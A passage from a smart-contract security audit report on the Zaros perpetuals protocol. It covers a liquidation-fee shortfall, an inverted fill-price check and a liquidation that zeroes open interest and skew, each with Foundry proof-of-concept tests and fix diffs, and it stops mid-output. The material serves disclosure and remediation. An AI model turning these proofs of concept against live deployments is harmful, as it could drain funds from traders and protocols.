            ctx.tradingAccountId, ctx.fuzzMarketConfig.marketId, ctx.fuzzMarketConfig.mockUsdPrice
        );

        // @audit Only initial margin is left.
        assertEq(
            UD60x18.unwrap(TradingAccountHarness(address(perpsEngine)).exposed_getMarginCollateralBalance({
                tradingAccountId: 1,
                collateralType: address(usdz)
            }))
            , 1000000000050000000,
            "Wrong margin collateral balance after liquidation"
        );

        // @audit Make the position liquidatable.
        uint256 updatedPrice = MOCK_BTC_USD_PRICE - MOCK_BTC_USD_PRICE / 10;
        updateMockPriceFeed(BTC_USD_MARKET_ID, updatedPrice);

        uint128[] memory accountsIds = new uint128[](1);
        accountsIds[0] = 1;
        changePrank({ msgSender: liquidationKeeper });

        // @audit liquidation fee is equal to the initial margin, but is less than LIQUIDATION_FEE_USD = 5e18.
        // ctx.liquidatedCollateralUsdX18: 1000000000050000000
        perpsEngine.liquidateAccounts(accountsIds);
        assertEq(
            UD60x18.unwrap(TradingAccountHarness(address(perpsEngine)).exposed_getMarginCollateralBalance({
                tradingAccountId: 1,
                collateralType: address(usdz)
            }))
            , 0,
            "Wrong margin collateral balance after liquidation"
        );
    }
}
```

## Impact
Traders may put too small collateral to pay the whole liquidation fee to exploit the imbalance between expected profit
and loss. `TradingAccount.deductAccountMargin` pays liquidation fee first, so market making engine also receives 0
from pnl.
https://github.com/Cyfrin/2024-07-zaros/blob/7439d79e627286ade431d4ea02805715e46ccf42/src/perpetuals/branches/LiquidationBranch.sol#L152-L161
https://github.com/Cyfrin/2024-07-zaros/blob/7439d79e627286ade431d4ea02805715e46ccf42/src/perpetuals/leaves/TradingAccount.sol#L528-L566

## Tools Used
Foundry.

## Recommendations
In `SettlementBranch._fillOrder`, check liquidation fee can be paid after paying the fee for
opening a position in `deductAccountMargin`.
```diff
            tradingAccount.deductAccountMargin({
                // ...
            });

+           tradingAccount.validateMarginRequirement(
+               UD60x18.wrap(0),
+               tradingAccount.getMarginBalanceUsd(accountTotalUnrealizedPnlUsdX18),
+               ctx.orderFeeUsdX18.add(UD60x18.wrap(globalConfiguration.liquidationFeeUsdX18))
+           );

            emit LogFillOrder(
```
https://github.com/Cyfrin/2024-07-zaros/blob/7439d79e627286ade431d4ea02805715e46ccf42/src/perpetuals/branches/SettlementBranch.sol#L495-L516

**Alternative**
In the test, `settlementFeeUsdX18` is configured to 2e18.
https://github.com/Cyfrin/2024-07-zaros/blob/7439d79e627286ade431d4ea02805715e46ccf42/script/markets/Markets.sol#L76
`orderFeeUsdX18` depends on skew, mark price, and sizeDelta.
https://github.com/Cyfrin/2024-07-zaros/blob/7439d79e627286ade431d4ea02805715e46ccf42/src/perpetuals/leaves/PerpMarket.sol#L155
If the sum of `settlementFeeUsdX18` and `orderFeeUsdX18` can be estimated well and more expensive, it can be compared
with `tradingAccount.getMarginBalanceUsd(accountTotalUnrealizedPnlUsdX18)` instead of `liquidationFeeUsdX18`.
## <a id='H-04'></a>H-04. Incorrect logic for checking isFillPriceValid

_Submitted by [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [samuraii77](https://profiles.cyfrin.io/u/samuraii77), [qpzm](https://profiles.cyfrin.io/u/qpzm), [Reentrants](https://codehawks.cyfrin.io/team/cly3oauyy000d26pej6o3uazr), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [kwakudr](https://profiles.cyfrin.io/u/kwakudr), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [blutorque](https://profiles.cyfrin.io/u/blutorque), [greed](https://profiles.cyfrin.io/u/greed), [AllTooWell](https://codehawks.cyfrin.io/team/clvmefpm30001oev62qxtl4zt), [brene](https://profiles.cyfrin.io/u/brene), [josh4324](https://profiles.cyfrin.io/u/josh4324), [bube](https://profiles.cyfrin.io/u/bube), [pelz](https://profiles.cyfrin.io/u/pelz), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [draiakoo](https://profiles.cyfrin.io/u/draiakoo), [0xlandlady](https://profiles.cyfrin.io/u/0xlandlady), [n0kto](https://profiles.cyfrin.io/u/n0kto), [forgebyola](https://profiles.cyfrin.io/u/forgebyola), [TeamRockSolid](https://codehawks.cyfrin.io/team/clygyrphg000bl0xpkpo7qch4), [bladesec](https://profiles.cyfrin.io/u/bladesec), [HawkEyes](https://codehawks.cyfrin.io/team/clz6n1eno000b5gq7lra17g1r), [benrai](https://profiles.cyfrin.io/u/benrai), [emma77](https://profiles.cyfrin.io/u/emma77), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [frontrunner](https://profiles.cyfrin.io/u/frontrunner), [CoderOfPHCity](https://profiles.cyfrin.io/u/CoderOfPHCity), [cryptedoji](https://profiles.cyfrin.io/u/cryptedoji), [0xshoonya](https://profiles.cyfrin.io/u/0xshoonya), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [0xd4n13l](https://profiles.cyfrin.io/u/0xd4n13l), [kildren](https://profiles.cyfrin.io/u/kildren), [minhquanym](https://profiles.cyfrin.io/u/minhquanym), [denzi](https://profiles.cyfrin.io/u/denzi). Selected submission by: [josh4324](https://profiles.cyfrin.io/u/josh4324)._      
            


## Summary

The logic for calculating if a trader added a valid FillPrice is not correct.

## Vulnerability Details

According to the code, when there is a buy order, the target price is less than or equal to the fill price, and when there is a sell order, the target price is greater than or equal to the fill price. Using the above conditions, any trader will not be able to set their target price because the isFillPriceValid will always be false and the trade will not go through. The correct implementation is the opposite of what is currently implemented.

```Solidity
 function fillOffchainOrders(
        uint128 marketId,
        OffchainOrder.Data[] calldata offchainOrders,
        bytes calldata priceData
    )
        external
        onlyOffchainOrdersKeeper(marketId)
    {
      ............

    @>   ctx.isFillPriceValid = (ctx.isBuyOrder && ctx.offchainOrder.targetPrice <= ctx.fillPriceX18.intoUint256())
    @>           || (!ctx.isBuyOrder && ctx.offchainOrder.targetPrice >= ctx.fillPriceX18.intoUint256());

            // we don't revert here because we want to continue filling other orders.
            if (!ctx.isFillPriceValid) {
                continue;
           }

      .............
    }
```

## POC

Copy the test to  test/integration/perpetuals/settlement-branch/fillOffchainOrders/fillOffchainOrders.t.sol

Run the test

```Solidity
 function testOffChainOrder()
        external
        givenTheSenderIsTheKeeper
        whenThePriceDataIsValid
        whenAllOffchainOrdersHaveAValidSizeDelta
        whenAllTradingAccountsExist
        whenAnOffchainOrdersMarketIdIsEqualToTheProvidedMarketId
        whenAllOffchainOrdersNoncesAreEqualToTheTradingAccountsNonces
    {
    

     MarketConfig memory fuzzMarketConfig = getFuzzMarketConfig(BTC_USD_MARKET_ID);

      uint256 initialMarginRate = 1000e18;

      initialMarginRate = bound({ x: initialMarginRate, min: fuzzMarketConfig.imr, max: MAX_MARGIN_REQUIREMENTS });
      uint256 marginValueUsd = 100000e18;
      marginValueUsd = bound({
            x: marginValueUsd,
            min: USDC_MIN_DEPOSIT_MARGIN,
            max: convertUd60x18ToTokenAmount(address(usdc), USDC_DEPOSIT_CAP_X18)
        });

        deal({ token: address(usdc), to: users.naruto.account, give: marginValueUsd });
        uint128 tradingAccountId = createAccountAndDeposit(marginValueUsd, address(usdc));
        int128 sizeDelta = fuzzOrderSizeDelta(
            FuzzOrderSizeDeltaParams({
                tradingAccountId: tradingAccountId,
                marketId: fuzzMarketConfig.marketId,
                settlementConfigurationId: SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
                initialMarginRate: ud60x18(initialMarginRate),
                marginValueUsd: ud60x18(marginValueUsd),
                maxSkew: ud60x18(fuzzMarketConfig.maxSkew),
                minTradeSize: ud60x18(fuzzMarketConfig.minTradeSize),
                price: ud60x18(fuzzMarketConfig.mockUsdPrice),
                isLong: true,
                shouldDiscountFees: true
            })
        );

        uint128 markPrice = perpsEngine.getMarkPrice(
            fuzzMarketConfig.marketId, fuzzMarketConfig.mockUsdPrice, sizeDelta
        ).intoUint128();

        uint128 targetPrice = 200000e18;

        bytes32 salt = bytes32(block.prevrandao);

        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                perpsEngine.DOMAIN_SEPARATOR(),
                keccak256(
                    abi.encode(
                        Constants.CREATE_OFFCHAIN_ORDER_TYPEHASH,
                        tradingAccountId,
                        fuzzMarketConfig.marketId,
                        sizeDelta,
                        targetPrice,
                        false,
                        uint120(0),
                        salt
                    )
                )
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign({ privateKey: users.naruto.privateKey, digest: digest });

        OffchainOrder.Data[] memory offchainOrders = new OffchainOrder.Data[](1);

        offchainOrders[0] = OffchainOrder.Data({
            tradingAccountId: tradingAccountId,
            marketId: fuzzMarketConfig.marketId,
            sizeDelta: sizeDelta,
            targetPrice: targetPrice,
            shouldIncreaseNonce: false,
            nonce: 0,
            salt: salt,
            v: v,
            r: r,
            s: s
        });

        bytes memory mockSignedReport =
            getMockedSignedReport(fuzzMarketConfig.streamId, fuzzMarketConfig.mockUsdPrice);
        address offchainOrdersKeeper = OFFCHAIN_ORDERS_KEEPER_ADDRESS;

        changePrank({ msgSender: offchainOrdersKeeper });

        perpsEngine.fillOffchainOrders(fuzzMarketConfig.marketId, offchainOrders, mockSignedReport);

    }
```

The above test does not fail but the order does not get completed, since the isFillPriceValid is false, it just skips the order and moves to the next offchain order.

## Impact

1. Traders will not be able to add target price which means they cannot add Take profit or stop loss to their trade
2. The Offchain order will always fail

## Tools Used

Manual Review

## Recommendations 

Change the condition to when there is a buy order, the target price is greater than or equal to the fill price, and when there is a sell order, the target price is less than or equal to the fill price.

```diff
function fillOffchainOrders(
        uint128 marketId,
        OffchainOrder.Data[] calldata offchainOrders,
        bytes calldata priceData
    )
        external
        onlyOffchainOrdersKeeper(marketId)
    {
      ............

-      ctx.isFillPriceValid = (ctx.isBuyOrder && ctx.offchainOrder.targetPrice <= ctx.fillPriceX18.intoUint256())
-           || (!ctx.isBuyOrder && ctx.offchainOrder.targetPrice >= ctx.fillPriceX18.intoUint256());
+      ctx.isFillPriceValid = (ctx.isBuyOrder && ctx.offchainOrder.targetPrice >= ctx.fillPriceX18.intoUint256())
+           || (!ctx.isBuyOrder && ctx.offchainOrder.targetPrice <= ctx.fillPriceX18.intoUint256());

            // we don't revert here because we want to continue filling other orders.
            if (!ctx.isFillPriceValid) {
                continue;
           }

      .............
    }
```

## <a id='H-05'></a>H-05. Market Disruption and Financial Loss Post-Liquidation

_Submitted by [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [samuraii77](https://profiles.cyfrin.io/u/samuraii77), [kwakudr](https://profiles.cyfrin.io/u/kwakudr), [shaflow01](https://profiles.cyfrin.io/u/shaflow01), [Reentrants](https://codehawks.cyfrin.io/team/cly3oauyy000d26pej6o3uazr), [ke1cam](https://profiles.cyfrin.io/u/ke1cam), [aamirusmani1552](https://profiles.cyfrin.io/u/aamirusmani1552), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [T1MOH](https://profiles.cyfrin.io/u/T1MOH), [shui](https://profiles.cyfrin.io/u/shui), [0xaman](https://profiles.cyfrin.io/u/0xaman), [bigsam](https://profiles.cyfrin.io/u/bigsam), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [h2134](https://profiles.cyfrin.io/u/h2134), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [crypt0n](https://profiles.cyfrin.io/u/crypt0n), [meeve](https://profiles.cyfrin.io/u/meeve), [0xstalin](https://profiles.cyfrin.io/u/0xstalin), [TeamRockSolid](https://codehawks.cyfrin.io/team/clygyrphg000bl0xpkpo7qch4), [blutorque](https://profiles.cyfrin.io/u/blutorque), [AuditTemple](https://codehawks.cyfrin.io/team/clyo65dx70009vjk4le7hszsf), [alexczm](https://profiles.cyfrin.io/u/alexczm), [draiakoo](https://profiles.cyfrin.io/u/draiakoo), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [impish](https://profiles.cyfrin.io/u/impish), [n0kto](https://profiles.cyfrin.io/u/n0kto), [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x), [DedOhwale](https://profiles.cyfrin.io/u/DedOhwale), [bladesec](https://profiles.cyfrin.io/u/bladesec), [infect3d](https://profiles.cyfrin.io/u/infect3d), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [0x1982us](https://profiles.cyfrin.io/u/0x1982us), [auditism](https://profiles.cyfrin.io/u/auditism), [twicek](https://profiles.cyfrin.io/u/twicek), [0xleadwizard](https://profiles.cyfrin.io/u/0xleadwizard), [tutkata](https://profiles.cyfrin.io/u/tutkata), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [Reentrants](https://codehawks.cyfrin.io/team/cly3oauyy000d26pej6o3uazr)._      
            


## Summary

&#x20;

This report identifies a critical vulnerability in the liquidation process of Zaros, which  leads to Denial of Service (DoS) and disruption of the market interests and metrics, affecting traders' positions and causing potential financial losses.

## Vulnerability Details

### Root Cause

Liquidating an account sets `openInterest` and `skew` to zero for that `marketId`. This occurs due to the `liquidateAccounts` not adding value to the new `OI` and `skew` before the `updateOpenInterest` call.

<https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/LiquidationBranch.sol#L209>

```Solidity

// update perp market's open interest and skew; we don't enforce ipen
                // interest and skew caps during liquidations as:
                // 1) open interest and skew are both decreased by liquidations
                // 2) we don't want liquidation to be DoS'd in case somehow those cap
                //    checks would fail
                perpMarket.updateOpenInterest(ctx.newOpenInterestX18, ctx.newSkewX18);

```

Note that the comment above this function indicates the devs intend to avoid DoS  during liquidation by skipping open interest and skew caps. However, the current implementation incorrectly sets `skew` and `OI` to zero instead.

This means in order to reproduce this vulnerability, we only need to liquidate one account and the protocol will have its `OI`  and  `skew` set to zero. 

This disrupts the protocol interests, positions, and fees as the following components rely on skew and OI: 

* fundingVelocity: 

```Solidity
 function getCurrentFundingVelocity(Data storage self) internal view returns (SD59x18) {
        SD59x18 maxFundingVelocity = sd59x18(uint256(self.configuration.maxFundingVelocity).toInt256());
        SD59x18 skewScale = sd59x18(uint256(self.configuration.skewScale).toInt256());

@>        SD59x18 skew = sd59x18(self.skew);

        if (skewScale.isZero()) {
  @>          return SD59x18_ZERO;
        }

        SD59x18 proportionalSkew = skew.div(skewScale);
        SD59x18 proportionalSkewBounded = Math.min(Math.max(unary(SD_UNIT), proportionalSkew), SD_UNIT);

        return proportionalSkewBounded.mul(maxFundingVelocity);
    }
```

* fundingRate

```Solidity
function getCurrentFundingRate(Data storage self) internal view returns (SD59x18) {
        return sd59x18(self.lastFundingRate).add(
@>            getCurrentFundingVelocity(self).mul(getProportionalElapsedSinceLastFunding(self).intoSD59x18())
        );
    }
```

* getOrderFeeUsd

```Solidity
function getOrderFeeUsd(
        Data storage self,
        SD59x18 sizeDelta,
        UD60x18 markPriceX18
    )
        internal
        view
        returns (UD60x18 orderFeeUsd)
    {
        // isSkewGtZero = true,  isBuyOrder = true,  skewIsZero = false -> taker
        // isSkewGtZero = true,  isBuyOrder = false, skewIsZero = false -> maker
        // isSkewGtZero = false, isBuyOrder = true,  skewIsZero = true  -> taker
        // isSkewGtZero = false, isBuyOrder = false, skewIsZero = true  -> taker
        // isSkewGtZero = false, isBuyOrder = true,  skewIsZero = false -> maker

        // get current skew int128 -> SD59x18
@>        SD59x18 skew = sd59x18(self.skew);

        // apply new order's skew to current skew
@>        SD59x18 newSkew = skew.add(sizeDelta);
```

* lastFundingFeePerUnit

```Solidity
// @audit getNextFundingFeePerUnit is incorrect due to skew 0 impact the `getCurrentFundingVelocity`
@> ctx.fundingFeePerUnitX18 = perpMarket.getNextFundingFeePerUnit(ctx.fundingRateX18, ctx.markPriceX18);

                // update funding rates for this perpetual market
@>                perpMarket.updateFunding(ctx.fundingRateX18, ctx.fundingFeePerUnitX18);
```

&#x20;&#x20;

* getAccruedFunding

```Solidity
function getAccruedFunding(
        Data storage self,
        SD59x18 fundingFeePerUnit
    )
        internal
        view
        returns (SD59x18 accruedFundingUsdX18)
    {
        @> SD59x18 netFundingFeePerUnit = fundingFeePerUnit.sub(sd59x18(self.lastInteractionFundingFeePerUnit));
        accruedFundingUsdX18 = sd59x18(self.size).mul(netFundingFeePerUnit);
    }
```

```Solidity
  function getMarkPrice(
        Data storage self,
        SD59x18 skewDelta,
        UD60x18 indexPriceX18
    )
        internal
        view
        returns (UD60x18 markPrice)
    {
        SD59x18 skewScale = sd59x18(self.configuration.skewScale.toInt256());
@>        SD59x18 skew = sd59x18(self.skew);

        SD59x18 priceImpactBeforeDelta = skew.div(skewScale);
@>        SD59x18 newSkew = skew.add(skewDelta);
```

At this moment the protocol: 

* Lost the imbalance among short/long positions. a.k.a `skew` 
* &#x20;Lost the `OI` for short/long positions.
* &#x20;

  Returns the wrong price for the orderFee in USD and getMarkPrice
* Lost the current interests metrics(fundingRate, fundingFeePerUnit)

Additionally, this will also cause a DoS in the system for positions that need to be updated, halting the market activity for those positions. I.e: Bob has an open position for the BTC market and he wants to increase his margin value, system will revert due to the following: 

As `openInterest` is 0 and `checkOpenInterestLimits`is used  on `fillOrder`, it will try to `sub`  the `oldPosition` value from the `currentOpenInterest` causing an underflow.
<https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/PerpMarket.sol#L286-L294>

```solidity
        UD60x18 maxOpenInterest = ud60x18(self.configuration.maxOpenInterest);
@>        UD60x18 currentOpenInterest = ud60x18(self.openInterest);


        // calculate new open interest which would result from proposed trade
        // by subtracting old position size then adding new position size to
        // current open interest
 @>       newOpenInterest =
            currentOpenInterest.sub(oldPositionSize.abs().intoUD60x18()).add(newPositionSize.abs().intoUD60x18());

```

## PoC

There are two tests on the PoC below. 

One reproduces the DoS and the other shows the incorrect values set to the variables mentioned above. 

* Setup: add the following code on `liquidateAccounts.t.sol` and run `forge test --match-test testGiveOneAccountIsLiquidated_ -vv`

```Solidity
// import "forge-std/console.sol";
function testGiveOneAccountIsLiquidated_systemWillSetIncorrectValueForSkewAndInterest_causingDoS_whenUserTryToUpdateHisPosition()
        external
        givenTheSenderIsARegisteredLiquidator
        whenTheAccountsIdsArrayIsNotEmpty
        givenAllAccountsExist
    {
        // pre condition - setup market conditions.
        TestFuzz_GivenThereAreLiquidatableAccountsInTheArray_Context memory ctx = _setupMarketConditions(10);

        // action - create 10+ long equal positions and liquidate only one
        // result: skew and OI == 0 after liquidation. 
        _createOrdersAndLiquidateAccounts_settingTheSkewAndOI_toZero(ctx, true, 10);
         _assertSkewAndOIasZero(ctx.fuzzMarketConfig.marketId);


        // action 2 - update the market with 2 shorts and 1 long position, liquidate 1 short.
        // result: skew and OI == 0 after liquidation again.
        changePrank({ msgSender: users.naruto.account });
        uint128 accountIdToBeUpdated = _createTwoShortPositions_OneLongPosition_AndLiquidateOneShortPosition(ctx);
         _assertSkewAndOIasZero(ctx.fuzzMarketConfig.marketId);

        // Impact: DoS when updating the position while the skew and open interest are set to zero.

         // DOS - [FAIL. Reason: panic: arithmetic underflow or overflow (0x11)] due to currentOpenInterest = 0.
         // https://github.com/Cyfrin/2024-07-zaros/blob/c97c68664048f251de8fab1e55a034bcd3df1ec9/src/perpetuals/leaves/PerpMarket.sol#L292-L293
         changePrank({ msgSender: users.naruto.account });
        _updateExistingPosition(ctx.fuzzMarketConfig, accountIdToBeUpdated, ctx.initialMarginRate, ctx.accountMarginValueUsd, true);   
    }

    function testGiveOneAccountIsLiquidated_theProtocolIsDisrupted_dueToWrongOIandSkew() 
        external
        givenTheSenderIsARegisteredLiquidator
        givenAllAccountsExist 
    { 
         // pre condition - open 2 positions
        uint256 marginValueUsdc = 100_000e6;
        int128 userPositionSizeDelta = 10e18;
        
        deal({ token: address(usdc), to: users.naruto.account, give: marginValueUsdc * 2 });
        // naruto creates a trading account and deposits their tokens as collateral
        changePrank({ msgSender: users.naruto.account });
        uint128 tradingAccountId = createAccountAndDeposit(marginValueUsdc, address(usdc));
        // naruto opens first position in BTC market

        _printSkewAndInterest(BTC_USD_MARKET_ID);

        openManualPosition(
            BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, userPositionSizeDelta
        );
        
        skip(1 hours);

        console.log("skew and OI after the first long position being opened");
        _printSkewAndInterest(BTC_USD_MARKET_ID);

        // fetch the correct price for the market properties
        SD59x18 sizeDelta = sd59x18(userPositionSizeDelta);
        uint256 correctFundingTime = block.timestamp;
        UD60x18 correctMarkPriceX18 = perpsEngine.getMarkPrice(
            BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE, sizeDelta.intoInt256()
        );

        uint256 correctOrderFeeInUsd = perpsEngine.exposed_getOrderFeeUsd(BTC_USD_MARKET_ID, sizeDelta, correctMarkPriceX18).intoUint128();
        SD59x18 correctFundingRateX18 = perpsEngine.getFundingRate(BTC_USD_MARKET_ID);
        SD59x18 correctNextFundingFeePerUnit = perpsEngine.exposed_getNextFundingFeePerUnit(
            BTC_USD_MARKET_ID, correctFundingRateX18, correctMarkPriceX18
        );

         // print all the values above
        console.log("one open position mark price: %e", correctMarkPriceX18.intoUint256());
        console.log("one open position order fee in usd: %e", correctOrderFeeInUsd);
        console.log("one open position funding rate x18: %e", correctFundingRateX18.intoInt256());
        console.log("one open position next funding fee per unit: %e", correctNextFundingFeePerUnit.intoInt256());
        console.log("");


        uint128 tradingAccountId2 = createAccountAndDeposit(marginValueUsdc, address(usdc));
        // naruto opens 2nd position in BTC market
        openManualPosition(
            BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId2, userPositionSizeDelta
        );

        skip(1 hours);

        console.log("skew and OI after the second long position being opened");
        _printSkewAndInterest(BTC_USD_MARKET_ID);

        correctMarkPriceX18 = perpsEngine.getMarkPrice(
            BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE, sizeDelta.intoInt256()
        );
        correctOrderFeeInUsd = perpsEngine.exposed_getOrderFeeUsd(BTC_USD_MARKET_ID, sizeDelta, correctMarkPriceX18).intoUint128();
        correctFundingRateX18 = perpsEngine.getFundingRate(BTC_USD_MARKET_ID);
        correctNextFundingFeePerUnit = perpsEngine.exposed_getNextFundingFeePerUnit(
            BTC_USD_MARKET_ID, correctFundingRateX18, correctMarkPriceX18
        );

        // values with 2 open positions...
        console.log("two open positions mark price: %e", correctMarkPriceX18.intoUint256());
        console.log("two open positions order fee in usd: %e", correctOrderFeeInUsd);
        console.log("two open positions funding rate x18: %e", correctFundingRateX18.intoInt256());
        console.log("two open positions next funding fee per unit: %e", correctNextFundingFeePerUnit.intoInt256());
        console.log("");

        updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE/2);
        _liquidateOneAccount(tradingAccountId2);
        updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE);

        skip(100 hours);

        console.log("skew and OI after one of the long positions being liquidated");
        _printSkewAndInterest(BTC_USD_MARKET_ID);

        correctMarkPriceX18 = perpsEngine.getMarkPrice(
            BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE, sizeDelta.intoInt256()
        );
        correctOrderFeeInUsd = perpsEngine.exposed_getOrderFeeUsd(BTC_USD_MARKET_ID, sizeDelta, correctMarkPriceX18).intoUint128();
        correctFundingRateX18 = perpsEngine.getFundingRate(BTC_USD_MARKET_ID);
        correctNextFundingFeePerUnit = perpsEngine.exposed_getNextFundingFeePerUnit(
            BTC_USD_MARKET_ID, correctFundingRateX18, correctMarkPriceX18
        );

        // values with one open position...
        console.log("one open position mark price: %e", correctMarkPriceX18.intoUint256());
        console.log("one open position order fee in usd: %e", correctOrderFeeInUsd);
        console.log("one open position funding rate x18: %e", correctFundingRateX18.intoInt256());
        console.log("one open position next funding fee per unit: %e", correctNextFundingFeePerUnit.intoInt256());
    }

    // HELPER FUNCTIONS

     function _assertSkewAndOIasZero(uint128 marketId) internal { 
        (UD60x18 longsOpenInterest, UD60x18 shortsOpenInterest, UD60x18 totalOpenInterest) = perpsEngine.getOpenInterest(marketId);

        // @audit all the interest rates and skew are set to zero, even though only one small position was liquidated.
        assertEq(0, perpsEngine.getSkew(marketId).intoInt256(), "skew != 0");
        assertEq(0, longsOpenInterest.intoUint256(), "longs open interest != 0"); 
        assertEq(0, shortsOpenInterest.intoUint256(), "shorts open interest != 0");
        assertEq(0, totalOpenInterest.intoUint256(), "total open interest != 0");
    }

    function _createOrdersAndLiquidateAccounts_settingTheSkewAndOI_toZero(TestFuzz_GivenThereAreLiquidatableAccountsInTheArray_Context memory ctx, bool isLong, uint256 amountOfTradingAccounts) internal {
        _createOpenPositions(ctx.fuzzMarketConfig, amountOfTradingAccounts, ctx.initialMarginRate, ctx.accountMarginValueUsd, isLong, ctx.accountsIds);

        // print skew and open interest after opening positions
        _printSkewAndInterest(ctx.fuzzMarketConfig.marketId);

        setAccountsAsLiquidatable(ctx.fuzzMarketConfig, isLong);

        ctx.nonLiquidatableTradingAccountId = createAccountAndDeposit(ctx.accountMarginValueUsd, address(usdz));
        ctx.accountsIds[amountOfTradingAccounts] = ctx.nonLiquidatableTradingAccountId;

        ctx.expectedLastFundingRate = perpsEngine.getFundingRate(ctx.fuzzMarketConfig.marketId).intoInt256();
        ctx.expectedLastFundingTime = block.timestamp;

        _liquidateOneAccount(ctx.accountsIds[2]); // liquidate a random account.
        skip(1 hours);
    }

    function _createTwoShortPositions_OneLongPosition_AndLiquidateOneShortPosition(TestFuzz_GivenThereAreLiquidatableAccountsInTheArray_Context memory ctx) internal returns(uint128 accountIdToBeUpdated) {
        // create 2 short positions
        console.log("adding 2 short positions...");
        uint128 accountIdToLiquidate = _createSingularPosition(ctx.fuzzMarketConfig, ctx.initialMarginRate, ctx.accountMarginValueUsd, false);
        accountIdToBeUpdated = _createSingularPosition(ctx.fuzzMarketConfig, ctx.initialMarginRate, ctx.accountMarginValueUsd, false);
        console.log("added... ");
        console.log("");

        // create 1 long position
        console.log("adding 1 long position...");
        _createSingularPosition(ctx.fuzzMarketConfig, ctx.initialMarginRate, ctx.accountMarginValueUsd, true);
        console.log("added... ");
        console.log("");
        
        // skew != 0
        _printSkewAndInterest(ctx.fuzzMarketConfig.marketId);

        // make liquidation possible
        setAccountsAsLiquidatable(ctx.fuzzMarketConfig, false);
        ctx.expectedLastFundingRate = perpsEngine.getFundingRate(ctx.fuzzMarketConfig.marketId).intoInt256();
        ctx.expectedLastFundingTime = block.timestamp;

        // liquidate only one short position
        console.log("liquidating one short position: %d ...", accountIdToLiquidate);
        _liquidateOneAccount(accountIdToLiquidate); // liquidate a random account.
        console.log("liquidated...");
        console.log("");

        skip(1 hours);
    }

    function _createOpenPositions(MarketConfig memory marketConfig, uint256 numberOfAccounts, uint256 initialMarginRate, uint256 margin, bool isLong, uint128[] memory accountIds) internal { 
        for (uint128 i; i < numberOfAccounts; i++) {
            accountIds[i] = _createSingularPosition(marketConfig, initialMarginRate, margin, isLong);
        }
    }

    function _createSingularPosition(MarketConfig memory marketConfig, uint256 initialMarginRate, uint256 margin, bool isLong) internal returns (uint128 tradingAccountId) { 
        deal({ token: address(usdz), to: users.naruto.account, give: margin });
        tradingAccountId = createAccountAndDeposit(margin, address(usdz));
        openPosition(marketConfig, tradingAccountId, initialMarginRate, margin, isLong);
    }

    function _updateExistingPosition(MarketConfig memory marketConfig, uint128 tradingAccountId, uint256 initialMarginRate, uint256 margin, bool isLong) internal { 
        deal({ token: address(usdz), to: users.naruto.account, give: margin });
        perpsEngine.depositMargin(tradingAccountId, address(usdz), margin);
        openPosition(marketConfig, tradingAccountId, initialMarginRate, margin, isLong);
    }

    function _setupMarketConditions(uint256 amountOfTradingAccounts) internal returns(TestFuzz_GivenThereAreLiquidatableAccountsInTheArray_Context memory ctx) { 
        // Pre conditions - Setup market conditions
        uint256 marketId = 1;
        ctx.fuzzMarketConfig = getFuzzMarketConfig(marketId);
        ctx.marginValueUsd = 10_000e18 / amountOfTradingAccounts;
        ctx.initialMarginRate = ctx.fuzzMarketConfig.imr;
        ctx.accountsIds = new uint128[](amountOfTradingAccounts + 2);
        ctx.accountMarginValueUsd = ctx.marginValueUsd / (amountOfTradingAccounts + 1);
    }

     function _liquidateOneAccount(uint128 tradingAccountId) internal { 
        changePrank({ msgSender: liquidationKeeper });
        skip(1 hours);

        uint128[] memory liquidableAccountIds = new uint128[](1);
        liquidableAccountIds[0] = tradingAccountId;
        perpsEngine.liquidateAccounts(liquidableAccountIds);
    }

    function _printSkewAndInterest(uint128 marketId) internal { 
        console.log("--------------------");
        console.log("skew: %e",  perpsEngine.getSkew(marketId).intoInt256());
         (UD60x18 longsOpenInterest, UD60x18 shortsOpenInterest, UD60x18 totalOpenInterest) = perpsEngine.getOpenInterest(marketId);
        console.log("longs open interest: %e",  longsOpenInterest.intoUint256());
        console.log("shorts open interest: %e",  shortsOpenInterest.intoUint256());
        console.log("total open interest: %e",  totalOpenInterest.intoUint256());
        console.log("--------------------");
        console.log("");
    }
```

Output:

```JavaScript
 --------------------
  skew: 0e0
  longs open interest: 0e0
  shorts open interest: 0e0
  total open interest: 0e0
  --------------------
  
  skew and OI after the first long position being opened
  --------------------
  skew: 1e19
  longs open interest: 1e19
  shorts open interest: 0e0
  total open interest: 1e19
  --------------------
  
  one open position mark price: 1.0000015e23
  one open position order fee in usd: 8.000012e20
  one open position funding rate x18: 1.249999999e9
  one open position next funding fee per unit: -2.604170506249e12
  
  skew and OI after the second long position being opened
  --------------------
  skew: 2e19
  longs open interest: 2e19
  shorts open interest: 0e0
  total open interest: 2e19
  --------------------
  
  two open positions mark price: 1.0000025e23
  two open positions order fee in usd: 8.00002e20
  two open positions funding rate x18: 3.749999998e9
